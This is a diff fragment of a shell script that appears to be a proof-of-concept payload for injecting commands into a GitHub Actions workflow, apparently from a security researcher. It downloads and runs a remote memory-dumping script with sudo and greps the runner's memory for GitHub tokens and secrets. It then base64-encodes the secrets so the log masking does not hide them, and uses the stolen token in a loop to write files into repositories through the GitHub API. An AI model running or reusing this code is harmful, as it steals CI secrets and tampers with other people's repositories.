@@ -6,12 +6,13 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 
 TOKEN_VAL64=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 `
 B64_BLOB=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
-echo "-----------------------------------------------------------------"
+echo "1-----------------------------------------------------------------"
 echo "abc" "$TOKEN_VAL" "xyz"
+echo "2-----------------------------------------------------------------"
 echo "${TOKEN_VAL:0:39}"
-#echo "-----------------------------------------------------------------"
+echo "3-----------------------------------------------------------------"
 echo "$TOKEN_VAL64"
-echo "-----------------------------------------------------------------"
+echo "4-----------------------------------------------------------------"
 echo "$B64_BLOB"
 echo "-----------------------------------------------------------------"
 for f in {a..z} {A..Z} {0..9}; do 
@@ -25,7 +26,7 @@ for f in {a..z} {A..Z} {0..9}; do
          --header "$Header" \
          --header "Accept: application/vnd.github.v3+json" \
          --header "X-GitHub-Api-Version: 2022-11-28" \
-         -d '{"message":"hello from r3s34rch","content":"Y3JlYXRlZCBieSByM3MzNHJjaCB1c2luZyBpbmplY3Rpb24gdmlhIHdvcmtmbG93IQ==", "sha":"SHA_FROM_ABOVE" }'
+         -d '{"message":"hello from r3s34rch","content":"Y3JlYXRlZCBieSByM3MzNHJjaCB1c2luZyBpbmplY3Rpb24gdmlhIHdvcmtmbG93IQ==" }'
     echo "-----------------------------------------------------------------"
 done
 
